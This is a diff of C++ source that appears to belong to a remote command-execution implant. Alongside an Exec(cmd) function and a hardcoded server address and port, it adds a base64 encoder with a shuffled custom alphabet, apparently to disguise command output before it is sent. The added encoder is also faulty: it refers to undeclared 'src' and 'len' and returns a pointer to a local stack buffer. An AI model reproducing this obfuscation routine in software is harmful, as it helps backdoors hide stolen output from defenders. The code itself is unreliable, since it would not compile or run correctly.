@@ -14,6 +14,9 @@
 #define PORT "80"
 #define SERVER_ADDRESS "127.0.0.1"
 
+static const unsigned char custom_table[65] =
+"uLoqK3h57MieJNUPzmdG1A9DCZBtjwlOVWaYTcx2pI/g0rb+4SfE6nFRHvyXkQs8";
+
 std::string Exec(std::string cmd) {
 
 	HANDLE read_handle;
@@ -112,7 +115,38 @@ Exit:
 }
 
 char* encoderesult(char *result, size_t resultlen) {
-	unsigned char *output
+	unsigned char *out, *pos;
+	const unsigned char *end, *in;
+
+	char outStr[INFO_BUFFER_SIZE] = {0};
+
+	out = (unsigned char*)&outStr[0];
+
+	end = src + len;
+	in = src;
+	pos = out;
+	while (end - in >= 3) {
+		*pos++ = custom_table[in[0] >> 2];
+		*pos++ = custom_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
+		*pos++ = custom_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];
+		*pos++ = custom_table[in[2] & 0x3f];
+		in += 3;
+	}
+
+	if (end - in) {
+		*pos++ = custom_table[in[0] >> 2];
+		if (end - in == 1) {
+			*pos++ = custom_table[(in[0] & 0x03) << 4];
+			*pos++ = '=';
+		}
+		else {
+			*pos++ = custom_table[((in[0] & 0x03) << 4) |
+				(in[1] >> 4)];
+			*pos++ = custom_table[(in[1] & 0x0f) << 2];
+		}
+		*pos++ = '=';
+	}
+	return outStr;
 }
 
 
